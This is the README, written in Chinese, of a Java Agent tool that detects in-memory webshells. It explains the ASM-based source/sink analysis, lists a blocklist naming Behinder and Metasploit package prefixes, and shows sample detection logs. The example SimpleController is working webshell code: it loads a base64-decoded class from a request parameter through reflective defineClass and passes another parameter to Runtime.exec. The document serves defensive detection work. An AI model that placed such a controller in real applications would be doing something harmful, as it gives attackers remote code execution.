# Mem-Shell-detector  

![](https://img.shields.io/badge/build-passing-brightgreen)
![](https://img.shields.io/badge/Java-8-red)
![](https://img.shields.io/badge/version-1.0-orange.svg)

## 介绍 

一款内存马检测工具，基于Java Agent实现。

实现原理如下：

程序运行后，attach到目标进程进行一次性检测，检测完成后再detach退出。

## 检测过程

1. 查找风险类

   （1） 通过黑名单过滤风险类，对类名进行关键词检索，默认黑名单为"net.rebeyond."和"com.metasploit.";
   
   （2） 获取Tomcat容器注册的组件类和SpringMVC容器注册的组件类的相关方法定义为风险方法，比如Filter组件的风险方法为doFilter。

2. 基于ASM进行风险方法检测
   
   （1） 对于查找到的风险类，则风险类的所有方法都进行检测。
   
   （2） 对于查找到的风险方法，则仅检测风险类的风险方法。
   
   （3） 基于ASM模拟栈帧进行检测，检测目标风险方法，以及风险方法调用的方法，深入调用过程进行深度分析。
   
## 方法库定义

    文中基于dongtai定义的方法规则，
    
    定义了Source方法，Sink方法，以及其他敏感方法，
    
    根据规则提供更多的方法信息，尽可能的检测可能被污染的类。

## 待实现功能

   1.目前基于retransformClasses进行获取字节码信息，后续考虑使用sa-jdi获取。

   2.发现内存马后通过获取本地磁盘的对应class文件进行自动修复。

   3.工程性优化


## 运行方法

1. 下载detector-select.jar，直接跳过步骤2-4，进行步骤5或者步骤6即可。
2. 下载当前源代码。
3. 在maven的根目录，clean install。
4. 在detector-select的target目录下找到detector-select.jar
5. java -jar detector-select.jar 运行后输入 目标java进程的序号，对目标进行检测。
6. 或者 java -jar detector-select.jar -p <pid>

检测示例：

    在web-test工程下，
    
    通过SpringMVC暴露SimpleController的方法对外提供服务调用。
    
    假定SimpleController是被内存马恶意注册的组件，
    
    检测工具通过对SimpleController的helloWorld方法进行分析，
    
    进而对其调用的getMethod和invoke进行结合分析，
    
    进而检测到多个方法的逻辑组合进行反射调用ClassLoader.defineClass。
    
    从而判定SimpleController可能是一个内存马污染的类。

SimpleController代码：

```java
@RestController
public class SimpleController {
/**/
    @GetMapping("/hello")
    public String helloWorld(String name, HttpServletRequest request) throws NoSuchMethodException {
        String payload = request.getParameter("payload");
        String methodName = request.getParameter("methodName");
        if(payload!=null){
            byte[] classData = Base64.getDecoder().decode(payload);
            if(methodName!=null){
                Method method = getMethod(methodName);
                invoke(method,classData);
            }

            invoke(getMethod2("defineClass"),classData);
        }
        String payload2 = request.getParameter("payload2");
        if(payload2!=null){
            test(payload2);
        }
        return "hello world," + name;
    }

    private Method getMethod(String methodName) throws NoSuchMethodException {
        Method method2 = Thread.currentThread().getContextClassLoader().getClass()
                .getDeclaredMethod
                        (methodName, new Class[]{String.class, byte[].class, int.class, int.class});
        return method2;
    }

    private Method getMethod2(String methodName) throws NoSuchMethodException {
        Method method = ClassLoader.class
                .getDeclaredMethod(methodName, new Class[]{String.class, byte[].class, int.class, int.class});
        return method;
    }



    public void invoke(Method method,byte[] classData){
        try {
            method.invoke(Thread.currentThread().getContextClassLoader(), classData, 0, classData.length);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
    }

    private void test(String payload2 ){
        try {
            Runtime.getRuntime().exec(payload2);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
```

检测结果：

```
18:06:09.847 [INFO]  --------------------
18:06:09.847 [INFO]  发现可能与该Sink方法同Class类型的反射调用：java/lang/ClassLoader.defineClass
18:06:09.847 [INFO]      Sink方法反射的调用链如下:
18:06:09.847 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.847 [INFO]      org.wanghailu.detector.test.controller.SimpleController.invoke((Ljava/lang/reflect/Method;[B)V)
18:06:09.847 [INFO]      反射的类型推断调用链如下:
18:06:09.847 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.847 [INFO]      org.wanghailu.detector.test.controller.SimpleController.getMethod((Ljava/lang/String;)Ljava/lang/reflect/Method;)
18:06:09.847 [INFO]  第0个参数溯源发现可能的Source调用:javax/servlet/http/HttpServletRequest.getParameter(Ljava/lang/String;)
18:06:09.847 [INFO]      调用链如下:
18:06:09.847 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.847 [INFO]  第2个参数溯源发现可能的Base64处理调用:java/util/Base64$Decoder.decode(Ljava/lang/String;)
18:06:09.847 [INFO]      调用链如下:
18:06:09.847 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.847 [INFO]  第2个参数溯源发现可能的Source调用:javax/servlet/http/HttpServletRequest.getParameter(Ljava/lang/String;)
18:06:09.847 [INFO]      调用链如下:
18:06:09.847 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.848 [INFO]  --------------------
18:06:09.848 [INFO]  发现Sink方法的反射调用：java/lang/ClassLoader.defineClass
18:06:09.848 [INFO]      Sink方法反射的调用链如下:
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.invoke((Ljava/lang/reflect/Method;[B)V)
18:06:09.848 [INFO]      反射的类型推断调用链如下:
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.getMethod2((Ljava/lang/String;)Ljava/lang/reflect/Method;)
18:06:09.848 [INFO]      反射的方法名推断调用链如下:
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.848 [INFO]  第2个参数溯源发现可能的Base64处理调用:java/util/Base64$Decoder.decode(Ljava/lang/String;)
18:06:09.848 [INFO]      调用链如下:
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.848 [INFO]  第2个参数溯源发现可能的Source调用:javax/servlet/http/HttpServletRequest.getParameter(Ljava/lang/String;)
18:06:09.848 [INFO]      调用链如下:
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.848 [INFO]  --------------------
18:06:09.848 [INFO]  发现Sink方法的反射调用：java/lang/ClassLoader.defineClass
18:06:09.848 [INFO]      Sink方法反射的调用链如下:
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.invoke((Ljava/lang/reflect/Method;[B)V)
18:06:09.848 [INFO]      反射的类型推断调用链如下:
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.getMethod2((Ljava/lang/String;)Ljava/lang/reflect/Method;)
18:06:09.848 [INFO]      反射的方法名推断调用链如下:
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.848 [INFO]  第2个参数溯源发现可能的Base64处理调用:java/util/Base64$Decoder.decode(Ljava/lang/String;)
18:06:09.848 [INFO]      调用链如下:
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.848 [INFO]  第2个参数溯源发现可能的Source调用:javax/servlet/http/HttpServletRequest.getParameter(Ljava/lang/String;)
18:06:09.848 [INFO]      调用链如下:
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.848 [INFO]  --------------------
18:06:09.848 [INFO]  发现Sink方法调用：java/lang/Runtime.exec
18:06:09.848 [INFO]      Sink方法调用链如下:
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.test((Ljava/lang/String;)V)
18:06:09.848 [INFO]  第1个参数溯源发现可能的Source调用:javax/servlet/http/HttpServletRequest.getParameter(Ljava/lang/String;)
18:06:09.848 [INFO]      调用链如下:
18:06:09.848 [INFO]      org.wanghailu.detector.test.controller.SimpleController.helloWorld((Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;)Ljava/lang/String;)
```



## 最后

     工具尚不完善，欢迎大佬们提出意见或二次开发